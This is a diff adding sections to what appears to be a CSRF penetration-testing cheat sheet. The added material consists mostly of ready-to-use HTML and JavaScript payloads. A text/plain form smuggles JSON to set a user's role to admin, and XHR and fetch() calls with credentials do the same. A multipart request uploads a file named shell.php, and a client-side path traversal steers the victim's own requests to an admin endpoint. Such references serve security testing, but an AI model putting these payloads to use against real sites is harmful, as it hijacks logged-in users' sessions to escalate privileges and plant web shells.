@@ -243,3 +243,82 @@ OAuth flow without `state` parameter → CSRF on the OAuth authorization:
 □ Test referrer-based protection: send request with no Referer header
 □ Test referrer-based protection: spoof subdomain in referer
 ```
+
+---
+
+## 11. JSON CSRF TECHNIQUES
+
+### Method 1: text/plain Disguise
+
+```html
+<!-- Browser sends Content-Type: text/plain with JSON-like body -->
+<form action="https://target.com/api/role" method="POST" enctype="text/plain">
+  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
+  <input type="submit" value="Click me">
+</form>
+<!-- Resulting body: {"role":"admin","ignore":"="} -->
+<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->
+```
+
+### Method 2: XHR with Credentials
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://target.com/api/role", true);
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.send('{"role":"admin"}');
+</script>
+<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->
+```
+
+### Method 3: fetch() API
+
+```html
+<script>
+fetch("https://target.com/api/role", {
+  method: "POST",
+  credentials: "include",
+  headers: {"Content-Type": "text/plain"},
+  body: '{"role":"admin"}'
+});
+</script>
+```
+
+---
+
+## 12. MULTIPART CSRF & CLIENT-SIDE PATH TRAVERSAL
+
+### Multipart File Upload CSRF
+
+```html
+<script>
+var formData = new FormData();
+formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
+formData.append("action", "upload");
+
+fetch("https://target.com/upload", {
+  method: "POST",
+  credentials: "include",
+  body: formData
+});
+</script>
+```
+
+### Client-Side Path Traversal to CSRF (CSPT2CSRF)
+
+```
+Normal flow: Frontend fetches /api/user/PROFILE_ID/settings
+Attack: Set PROFILE_ID to ../../admin/dangerous-action
+
+Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies
+This converts a path traversal into a CSRF-like attack without needing a CSRF token
+```
+
+| Aspect | Traditional CSRF | CSPT2CSRF |
+|---|---|---|
+| Origin | Attacker's site | Same-origin JavaScript |
+| Token bypass | Needs token forgery | No token needed (same-origin) |
+| SameSite | Blocked by SameSite=Strict | Bypasses SameSite (same site!) |
+| Detection | Standard CSRF checks | Requires input validation on path segments |
